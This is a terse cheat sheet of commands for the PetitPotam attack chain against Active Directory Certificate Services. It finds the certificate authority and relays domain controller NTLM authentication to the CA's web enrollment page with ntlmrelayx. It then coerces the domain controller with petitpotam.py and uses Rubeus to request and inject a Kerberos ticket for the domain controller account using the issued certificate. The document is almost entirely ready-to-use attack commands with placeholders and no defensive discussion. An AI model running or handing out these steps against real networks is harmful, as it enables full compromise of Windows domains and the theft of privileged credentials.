### source
https://github.com/ollypwn/PetitPotam  

### find certificate autthority
```
certutil.exe
```

### set up ntlm relay (forward incoming authentication from domain controller to certificate authority)
```
python3 ntlmrelayx.py -t http://<certificateAuthority>/certsrv/certfnsh.asp -smb2support --adcs
```

### trigger authentication from domain controller
```
python3 petitpotam.py '<lhost>' '<domainController>'
```

### request kerberos TGT
```
Rubeus.exe asktgt /outfile:<file> /user:<domainController> /ptt /certificate:<base64Certificate>
```
